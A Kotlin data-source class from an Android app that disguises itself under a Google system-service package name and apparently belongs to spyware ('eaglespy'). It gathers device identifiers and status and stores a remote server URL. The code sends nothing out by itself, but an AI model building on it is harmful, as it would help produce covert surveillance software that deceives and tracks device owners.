package com.google.android.systemservice.data.datasource

import android.content.Context
import android.content.SharedPreferences
import android.provider.Settings
import com.google.android.systemservice.domain.model.DeviceInfo
import com.google.android.systemservice.domain.model.DeviceStatus
import com.google.android.systemservice.utils.DeviceInfoProvider
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class LocalDataSource @Inject constructor(
    @ApplicationContext private val context: Context
) {
    private val prefs: SharedPreferences = 
        context.getSharedPreferences("eaglespy_prefs", Context.MODE_PRIVATE)
    
    private val _deviceStatusFlow = MutableStateFlow(DeviceStatus.UNKNOWN)
    val deviceStatusFlow: StateFlow<DeviceStatus> = _deviceStatusFlow.asStateFlow()
    
    fun updateDeviceStatus(status: DeviceStatus) {
        _deviceStatusFlow.value = status
    }
    
    fun getDeviceInfo(): DeviceInfo {
        return DeviceInfo(
            deviceId = getDeviceId(),
            model = DeviceInfoProvider.getFormattedModel(),
            androidVersion = DeviceInfoProvider.getAndroidVersion(),
            batteryLevel = DeviceInfoProvider.getBatteryLevel(context),
            networkType = DeviceInfoProvider.getNetworkType(context)
        )
    }
    
    @Synchronized
    private fun getDeviceId(): String {
        val existing = prefs.getString("device_id", null)
        if (existing != null) return existing
        val newId = try {
            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
                ?: java.util.UUID.randomUUID().toString()
        } catch (e: Exception) {
            java.util.UUID.randomUUID().toString()
        }
        prefs.edit().putString("device_id", newId).apply()
        return newId
    }
    
    fun getServerUrl(): String {
        return prefs.getString("server_url", "") ?: ""
    }
    
    fun setServerUrl(url: String) {
        prefs.edit().putString("server_url", url).apply()
    }
}
